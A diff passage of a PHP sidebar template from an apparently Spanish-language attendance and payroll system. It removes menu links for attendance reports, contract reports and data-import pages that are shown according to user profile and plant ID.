-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte Percepciones No timbradas</span>
-                                    </a>
-                                </li>
-
-                                <?php } ?>  
-                                
-                                <?php } ?>  
-                                
-                                
-                                <?php if ($user->idPlanta!=22 && $user->idPlanta!=25)  {?>
-                               
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="checadas" aria-expanded="true">
-                                        <i class="fa fa-table"></i>
-                                        <span class="hide-menu">Reporte Checadas</span>
-                                    </a>
-                                </li>        
-                                <?php } ?>          
-
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="checadasBiostar" aria-expanded="true">
-                                        <i class="fa fa-table"></i>
-                                        <span class="hide-menu">Reporte Checadas Biostar</span>
-                                    </a>
-                                </li>
-                                
-                                <?php if ($user->idPerfil==5 || $user->idPerfil==1)  {?>
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="contrato" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte Contrato</span>
-                                    </a>
-                                </li>
-                                
-                                <?php } ?>  
-                            </ul>
-                        </li>
-                        
-                        <?php if ($user->idPerfil==2 || $user->idPerfil==5 || $user->idPerfil==1)  {?>
-                        <li class=""> <a class="has-arrow waves-effect waves-dark" href="#" aria-expanded="true">
-                            <i class="icon-Double-Circle"></i><span class="hide-menu">Importar/Exportar</span></a>
-                            <ul aria-expanded="true" class="collapse" style="height: 0px;">                               
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="importar" aria-expanded="true">
-                                        <i class="fa fa-upload"></i>
-                                        <span class="hide-menu">ImportarBiostar</span>
-                                    </a>
-                                </li> 
-                                
-                                <?php if ($user->idPlanta!=22 && $user->idPlanta!=25)  {?>
-                               
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="importarAnviz" aria-expanded="true">
-                                        <i class="fa fa-upload"></i>
-                                        <span class="hide-menu">importarAnviz</span>
-                                    </a>
-                                </li> 
-                                
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="Reporte" aria-expanded="true">
-                                        <i class="fa fa-upload"></i>
-                                        <span class="hide-menu">Subir CSV CROM</span>
-                                    </a>
-                                </li> 
-                                
-                                <?php } ?>  
-
-
-                                <?php if ($user->idPlanta>=1 && $user->idPlanta<=10  ||    $user->idPlanta>=16 &&  $user->idPlanta<=19  ||  $user->idPlanta==29 ) {?>   
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="ActualizaChecadasNomiPlusController" aria-expanded="true">
-                                        <i class="fa fa-upload"></i>
-                                        <span class="hide-menu">Importar Checadas Nomiplus</span>
-                                    </a>
-                                </li> 
-                                <?php } ?>  
-                                
-                            </ul>
-                        </li>
-                                <?php } ?>  
+                        <?php } ?>
                     </ul>
                 </nav>
                 <!-- End Sidebar navigation -->
